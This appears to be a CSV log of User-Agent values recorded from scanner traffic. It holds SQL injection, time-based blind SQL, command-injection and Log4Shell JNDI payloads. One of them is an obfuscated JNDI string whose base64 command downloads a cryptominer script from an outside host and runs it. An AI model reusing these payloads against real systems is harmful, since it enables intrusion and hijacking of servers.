Time,User Agent
"2026-06-22 00:45:35","x' OR SLEEP(8) OR 'x"
"2026-06-16 17:31:42","x' OR SLEEP(8) OR 'x"
"2026-06-14 23:09:45","x' OR SLEEP(8) OR 'x"
"2026-06-12 22:10:19","x' OR SLEEP(8) OR 'x"
"2026-06-03 19:53:36","WebEnumerationFramework/11.0 ${jndi:ldap://127.0.0.1/a}"
"2026-06-03 19:53:23","AssetProfiler/6.5 ${jndi:ldap://127.0.0.1/a}"
"2026-06-03 18:28:35","SecurityAssessmentClient/3.1 ${jndi:ldap://127.0.0.1/a}"
"2026-06-03 10:46:36","1' OR '1'='1"
"2026-06-03 01:06:32","ReconEngine/5.4 ${jndi:ldap://127.0.0.1/a}"
"2026-06-03 01:02:22","' OR 1=1--"
"2026-06-03 01:02:19","ThreatHunterAgent/8.2 ${jndi:ldap://127.0.0.1/a}"
"2026-06-03 01:02:14","VulnerabilitySweep/2.6 ${jndi:ldap://127.0.0.1/a}"
"2026-06-01 15:32:43","${jndi:ldap://127.0.0.1/a}"
"2026-06-01 15:31:50","<<<<>>>>"
"2026-06-01 10:44:53","<<<<>>>>"
"2026-06-01 10:44:42","AssetProfiler/6.5 ${jndi:ldap://127.0.0.1/a}"
"2026-06-01 08:54:45","1' OR '1'='1"
"2026-06-01 08:54:45","' OR 1=1--"
"2026-06-01 08:54:26","DiscoveryProbe/7.3 ${jndi:ldap://127.0.0.1/a}"
"2026-06-01 08:54:26","VulnerabilitySweep/2.6 ${jndi:ldap://127.0.0.1/a}"
"2026-06-01 08:53:51","<<<<>>>>"
"2026-06-01 08:53:47","${jndi:ldap://127.0.0.1/a}"
"2026-06-01 01:19:28","${jndi:ldap://127.0.0.1/a}"
"2026-06-01 01:19:14","' OR 1=1--"
"2026-06-01 01:19:06","<<<<>>>>"
"2026-05-31 19:41:32","1' OR '1'='1"
"2026-05-31 19:41:29","VulnerabilitySweep/2.6 ${jndi:ldap://127.0.0.1/a}"
"2026-05-31 19:41:29","${jndi:ldap://127.0.0.1/a}"
"2026-05-31 19:41:27","<<<<>>>>"
"2026-05-31 17:06:29","${jndi:ldap://127.0.0.1/a}"
"2026-05-31 17:05:27","<<<<>>>>"
"2026-05-31 14:50:39","<<<<>>>>"
"2026-05-31 14:50:27","${jndi:ldap://127.0.0.1/a}"
"2026-05-31 11:20:45","1' OR '1'='1"
"2026-05-30 12:26:44","DiscoveryProbe/7.3 ${jndi:ldap://127.0.0.1/a}"
"2026-05-30 11:32:35","${jndi:ldap://127.0.0.1/a}"
"2026-05-30 11:30:54","<<<<>>>>"
"2026-05-30 11:30:50","' OR 1=1--"
"2026-05-30 11:29:43","${jndi:ldap://127.0.0.1/a}"
"2026-05-30 11:29:26","1' OR '1'='1"
"2026-05-30 11:29:22","TelemetryCollector/9.7 ${jndi:ldap://127.0.0.1/a}"
"2026-05-30 11:29:20","<<<<>>>>"
"2026-05-30 11:29:19","SecurityAssessmentClient/3.1 ${jndi:ldap://127.0.0.1/a}"
"2026-05-29 17:20:07","' OR 1=1--"
"2026-05-29 17:20:00","TelemetryCollector/9.7 ${jndi:ldap://127.0.0.1/a}"
"2026-05-29 13:45:04","' OR 1=1--"
"2026-05-29 13:40:23","' OR 1=1--"
"2026-05-29 13:39:04","' OR 1=1--"
"2026-05-29 13:30:01","' OR 1=1--"
"2026-05-29 13:26:19","' OR 1=1--"
"2026-05-29 13:20:31","' OR 1=1--"
"2026-05-29 13:16:50","' OR 1=1--"
"2026-06-01 15:31:42","""@@@@@@@"""
"2026-06-01 10:44:30","""@@@@@@@"""
"2026-06-01 01:19:03","""@@@@@@@"""
"2026-05-31 19:41:21","""@@@@@@@"""
"2026-05-31 14:51:09","""@@@@@@@"""
"2026-05-31 11:20:50","""@@@@@@@"""
"2026-05-30 11:25:42","""@@@@@@@"""
"2026-05-29 18:05:38","""@@@@@@@"""
"2026-05-29 17:20:59","""@@@@@@@"""
"2026-06-03 10:05:14","#"
"2026-06-01 15:32:22","select pg_sleep(3)"
"2026-06-01 10:44:27","select pg_sleep(3)"
"2026-06-01 01:19:11","select pg_sleep(3)"
"2026-05-31 19:41:24","select pg_sleep(3)"
"2026-05-31 17:05:22","select pg_sleep(3)"
"2026-05-31 13:16:47","#"
"2026-05-31 10:05:03","#"
"2026-05-30 12:26:26","select pg_sleep(3)"
"2026-05-30 11:30:52","select pg_sleep(3)"
"2026-05-26 11:20:15","#"
"2026-06-13 10:46:03","ThreatHunterAgent/8.2 1' OR '1'='1"
"2026-06-12 23:38:27","SecurityAssessmentClient/3.1 1' OR '1'='1"
"2026-06-12 22:09:44","DiscoveryProbe/7.3 1' OR '1'='1"
"2026-06-12 16:25:08","DiscoveryProbe/7.3 1' OR '1'='1"
"2026-06-01 15:32:41","VulnerabilitySweep/2.6 1' OR '1'='1"
"2026-06-01 10:44:29","DiscoveryProbe/7.3 1' OR '1'='1"
"2026-06-01 01:18:59","ThreatHunterAgent/8.2 1' OR '1'='1"
"2026-05-31 14:51:12","select pg_sleep(6)"
"2026-06-12 23:38:27","NetworkSurveyBot/3.9 1' OR '1'='1"
"2026-06-12 23:38:26","AssetProfiler/6.5 1' OR '1'='1"
"2026-06-12 22:09:44","ReconEngine/5.4 1' OR '1'='1"
"2026-06-12 20:19:43","NetworkSurveyBot/3.9 1' OR '1'='1"
"2026-06-03 18:28:34","waitfor delay '0:0:5'"
"2026-06-01 15:32:25","NetworkSurveyBot/3.9 1' OR '1'='1"
"2026-06-01 15:31:53","select pg_sleep(6)"
"2026-06-01 15:31:53","waitfor delay '0:0:9'"
"2026-06-01 08:54:30","waitfor delay '0:0:5'"
"2026-06-01 08:53:46","select pg_sleep(6)"
"2026-05-31 22:15:54","select pg_sleep(6)"
"2026-05-31 11:20:50","select pg_sleep(6)"
"2026-05-31 11:20:47","waitfor delay '0:0:5'"
"2026-05-30 11:29:19","ReconEngine/5.4 1' OR '1'='1"
"2026-06-02 22:35:43","ReconEngine/5.4 1' OR '1'='1"
"2026-06-01 15:32:25",""" OR 1=1--"
"2026-06-01 10:44:39",""" OR 1=1--"
"2026-06-01 08:54:28",""" OR 1=1--"
"2026-05-31 22:15:38","waitfor delay '0:0:5'"
"2026-05-31 14:50:30",""" OR 1=1--"
"2026-05-29 17:20:22",""" OR 1=1--"
"2026-05-30 11:31:45","t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//148.113.233.202:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vMzEuNTcuMTA5LjEzMS9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==}')"
"2026-06-09 11:36:13","*BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA="
"2026-06-09 11:32:56","*BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA="
"2026-06-09 11:29:13","*BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA="
"2026-06-09 11:22:11","*BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA="
"2026-06-09 11:18:36","*BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA="
"2026-06-09 11:12:15","*BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA="
"2026-06-09 11:06:13","*BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA=, *BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA="
"2026-06-09 11:01:26","*BcfBAAAAAAAAAAAAAAAAAAAAahgQRn7aueKqDVwUAGivsDOAV6gBAIAAKAA="
"2026-06-01 08:54:27","${jndi:rmi://127.0.0.1/exploit}"
"2026-06-01 08:54:00","${jndi:dns://127.0.0.1/x}"
"2026-05-31 17:05:25","${jndi:rmi://127.0.0.1/exploit}"
"2026-05-31 14:50:42","${jndi:dns://127.0.0.1/x}"
"2026-05-31 11:20:41","${jndi:dns://127.0.0.1/x}"
"2026-05-30 11:30:53","${jndi:rmi://127.0.0.1/exploit}"
"2026-06-01 15:32:44","${jndi:rmi://127.0.0.1/exploit}"
"2026-06-01 15:31:45","${jndi:dns://127.0.0.1/x}"
"2026-06-01 10:44:29","${jndi:dns://127.0.0.1/x}"
"2026-05-31 19:41:36","${jndi:rmi://127.0.0.1/exploit}"
"2026-05-31 19:41:24","${jndi:dns://127.0.0.1/x}"
"2026-05-30 12:26:52","${jndi:dns://127.0.0.1/x}"
"2026-06-12 20:19:43","TelemetryCollector/9.7 @@@@@@@"
"2026-06-12 20:19:43","VulnerabilitySweep/2.6 @@@@@@@"
"2026-06-12 16:25:07","TelemetryCollector/9.7 @@@@@@@"
"2026-06-03 10:46:31","VulnerabilitySweep/2.6 @@@@@@@"
"2026-06-01 15:32:24","TelemetryCollector/9.7 @@@@@@@"
"2026-06-16 11:59:13","TelemetryCollector/9.7 @@@@@@@"
"2026-06-14 14:04:43","TelemetryCollector/9.7 @@@@@@@"
"2026-06-14 14:04:34","ThreatHunterAgent/8.2 @@@@@@@"
"2026-06-13 11:36:22","SecurityAssessmentClient/3.1 @@@@@@@"
"2026-06-13 11:36:21","NetworkSurveyBot/3.9 @@@@@@@"
"2026-06-12 23:38:28","TelemetryCollector/9.7 @@@@@@@"
"2026-06-12 22:09:43","SecurityAssessmentClient/3.1 @@@@@@@"
"2026-06-12 20:19:42","InternalAuditScanner/4.0 @@@@@@@"
"2026-06-12 16:25:08","SecurityAssessmentClient/3.1 @@@@@@@"
"2026-06-12 16:25:08","WebEnumerationFramework/11.0 @@@@@@@"
"2026-06-12 16:25:08","AssetProfiler/6.5 @@@@@@@"
"2026-06-09 15:36:44","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcPAAAAAAAAAAAA="
"2026-06-09 15:32:07","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcPAAAAAAAAAAAA="
"2026-06-09 15:27:23","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcPAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcPAAAAAAAAAAAA="
"2026-06-09 15:10:11","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA="
"2026-06-09 15:06:12","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA="
"2026-06-09 15:02:31","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA="
"2026-06-09 14:59:04","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA="
"2026-06-09 14:55:11","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA="
"2026-06-09 14:54:37","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA="
"2026-06-09 14:47:29","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA="
"2026-06-09 14:44:56","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwBAAAAAAAAAAAA="
"2026-06-09 14:25:31","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsHIAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsHIAV6gBAIAAKAA="
"2026-06-09 14:23:22","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsHIAV6gBAIAAKAA="
"2026-06-09 14:19:24","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsHIAV6gBAIAAKAA="
"2026-06-09 14:10:31","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsHIAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsHIAV6gBAIAAKAA="
"2026-06-09 14:10:03","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMLAAAAAAAAAAAA="
"2026-06-09 14:07:40","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMLAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMLAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMLAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMLAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMLAAAAAAAAAAAA="
"2026-06-09 14:02:00","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMLAAAAAAAAAAAA="
"2026-06-09 13:56:24","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMLAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMLAAAAAAAAAAAA="
"2026-06-09 13:25:11","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA="
"2026-06-09 13:22:06","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA="
"2026-06-09 13:18:14","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA="
"2026-06-09 13:13:01","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA="
"2026-06-09 13:09:47","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcFAAAAAAAAAAAA="
"2026-06-09 12:55:53","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsXEAV6gBAIAAKAA="
"2026-06-09 12:51:52","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsXEAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsXEAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsXEAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsXEAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsXEAV6gBAIAAKAA="
"2026-06-09 12:47:38","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsXEAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsXEAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsXEAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsXEAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsXEAV6gBAIAAKAA="
"2026-06-09 12:42:12","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsXEAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsXEAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsXEAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsXEAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsXEAV6gBAIAAKAA="
"2026-06-09 12:41:25","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAA="
"2026-06-09 12:36:57","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAA="
"2026-06-09 12:30:07","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAA="
"2026-06-09 12:28:25","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAA="
"2026-06-09 12:10:19","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsTDAV6gBAIAAKAA="
"2026-06-09 12:05:21","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsTDAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsTDAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsTDAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsTDAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsTDAV6gBAIAAKAA="
"2026-06-09 12:00:15","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsTDAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsTDAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsTDAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsTDAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsTDAV6gBAIAAKAA="
"2026-06-09 11:58:32","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsTDAV6gBAIAAKAA="
"2026-06-09 11:55:09","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA="
"2026-06-09 11:51:31","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA="
"2026-06-09 11:46:30","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA="
"2026-06-09 11:43:53","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA="
"2026-06-09 11:38:54","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KAAAAAAAAAAAA="
"2026-06-03 18:24:25","AssetProfiler/6.5 @@@@@@@"
"2026-06-02 00:30:21","WebEnumerationFramework/11.0 @@@@@@@"
"2026-06-01 15:32:25","%%%%%%%"
"2026-06-01 10:44:53","${jndi:rmi://127.0.0.1/exploit}"
"2026-06-01 10:44:44","&&hostname"
"2026-06-01 08:54:26","%%%%%%%"
"2026-06-01 01:19:30","VulnerabilitySweep/2.6 @@@@@@@"
"2026-05-31 22:15:50","${jndi:rmi://127.0.0.1/exploit}"
"2026-05-31 19:41:29","&&hostname"
"2026-05-31 17:05:07","${jndi:dns://127.0.0.1/x}"
"2026-05-31 15:50:00","${jndi:dns://127.0.0.1/x}"
"2026-05-30 12:26:37","&&hostname"
"2026-05-30 11:32:35","&&hostname"
"2026-05-30 11:29:39","&&hostname"
"2026-05-30 11:29:20","SecurityAssessmentClient/3.1 @@@@@@@"
"2026-05-30 11:25:28","TelemetryCollector/9.7 @@@@@@@"
"2026-05-29 17:20:18","&&hostname"
"2026-06-14 14:04:45","WebEnumerationFramework/11.0 @@@@@@@"
"2026-06-12 23:38:27","ThreatHunterAgent/8.2 @@@@@@@"
